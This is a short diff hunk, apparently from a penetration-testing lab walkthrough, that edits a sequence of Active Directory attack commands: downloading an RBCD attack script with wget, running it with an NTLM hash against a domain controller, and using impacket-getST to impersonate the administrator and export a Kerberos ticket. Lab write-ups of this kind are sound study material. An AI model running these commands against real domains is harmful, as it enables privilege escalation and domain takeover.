@@ -940,7 +940,7 @@ Get-DomainComputer TEST
 
 wget https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py
 python3 rbcd.py -dc-ip 192.168.171.175 -t RESOURCEDC -f 'TEST' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone
-impacket-getST -spn cifs/ResourceDC.resourced.local resourced/TEST:'123456' -impersonate administrator -dc-ip 192.168.171.175
+impacket-getST -spn cifs/ResourceDC.resourced.local resourced.local/TEST\$:'123456' -impersonate administrator -dc-ip 192.168.171.175
 export KRB5CCNAME=./Administrator.ccache
 
 
